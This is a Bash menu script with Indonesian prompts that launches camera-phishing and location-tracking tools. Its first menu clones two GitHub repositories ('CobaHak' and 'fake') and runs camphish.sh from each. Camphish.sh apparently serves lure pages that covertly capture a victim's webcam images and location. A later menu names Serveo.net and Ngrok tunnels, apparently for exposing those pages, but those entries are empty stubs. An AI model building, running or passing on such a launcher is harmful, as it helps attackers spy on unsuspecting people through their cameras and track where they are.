#!/bin/bash

# --- Fungsi: Banner ---
banner() {
    clear
    local user_name=$(whoami)
    local time_now=$(date +"%Y-%m-%d %H:%M:%S")

    echo -e "\e[1;92m====================================================\e[0m"
    echo -e "\e[1;96m"
    echo "██╗   ██╗ █████╗ ███╗   ██╗"
    echo "██║   ██║██╔══██╗████╗  ██║"
    echo "██║   ██║███████║██╔██╗ ██║"
    echo "╚██╗ ██╔╝██╔══██║██║╚██╗██║"
    echo " ╚████╔╝ ██║  ██║██║ ╚████║"
    echo "  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝"
    echo -e "\e[0m"
    echo -e "\e[1;93m                  ✦✦✦   YAN   ✦✦✦\e[0m"
    echo -e "\e[1;95m                       Adrian\e[0m"
    echo -e "\e[1;92m====================================================\e[0m"
    echo ""
    echo -e "\e[1;36mUser       : \e[0m$user_name"
    echo -e "\e[1;36mWaktu      : \e[0m$time_now"
    echo -e "\e[1;36mPilih fitur yang ingin dijalankan:\e[0m"
    echo ""
    echo -e "\e[1;33m[1] Kamera (CobaHak)\e[0m"
    echo -e "\e[1;33m[2] Lacak Lokasi (Fake)\e[0m"
    echo -e "\e[1;33m[0] Lanjut ke Menu Tunnel\e[0m"
    echo ""

    read -p "Masukkan pilihan [0/1/2]: " option
    option="${option:-0}"

    case $option in
        1)
            read -p "Kamu yakin ingin menjalankan Kamera (y/n)? " confirm
            [[ $confirm =~ [yY] ]] || exit 0
            echo -e "\e[1;92m[*] Mengunduh & menjalankan CobaHak...\e[0m"
            git clone https://github.com/adrian020w/CobaHak.git
            cd CobaHak
            bash camphish.sh
            exit
            ;;
        2)
            read -p "Kamu yakin ingin menjalankan Lacak Lokasi (y/n)? " confirm
            [[ $confirm =~ [yY] ]] || exit 0
            echo -e "\e[1;92m[*] Mengunduh & menjalankan Fake...\e[0m"
            git clone https://github.com/umbrahabreh-arch/fake.git
            cd fake
            bash camphish.sh
            exit
            ;;
        0)
            echo -e "\e[1;96m➡ Menuju menu tunnel...\e[0m"
            ;;
        *)
            echo -e "\e[1;91m[!] Pilihan tidak valid. Keluar...\e[0m"
            exit 1
            ;;
    esac
}

# --- Fungsi: Submenu Tunnel ---
select_tunnel() {
    while true; do
        echo ""
        echo "===== Pilih Tunnel ====="
        echo "[1] Serveo.net"
        echo "[2] Ngrok"
        echo "[0] Kembali ke menu utama"
        read -p "[Default 1] Pilih: " option
        option="${option:-1}"

        case "$option" in
            1)
                echo "▶ Kamu memilih Serveo.net"
                # bash serveo.sh (atau isi lain)
                ;;
            2)
                echo "▶ Kamu memilih Ngrok"
                # bash ngrok.sh (atau isi lain)
                ;;
            0)
                echo "⬅ Kembali ke menu utama..."
                break
                ;;
            *)
                echo "❌ Pilihan tidak valid."
                ;;
        esac
    done
}

# --- Fungsi: Menu Utama ---
menu_utama() {
    while true; do
        echo ""
        echo "===== MENU UTAMA ====="
        echo "[1] Pilih Tunnel"
        echo "[0] Keluar"
        read -p "Pilih: " pilihan

        case "$pilihan" in
            1) select_tunnel ;;
            0) echo "👋 Keluar. Terima kasih!"; exit ;;
            *) echo "❌ Pilihan tidak valid." ;;
        esac
    done
}

# --- Eksekusi ---
banner
menu_utama
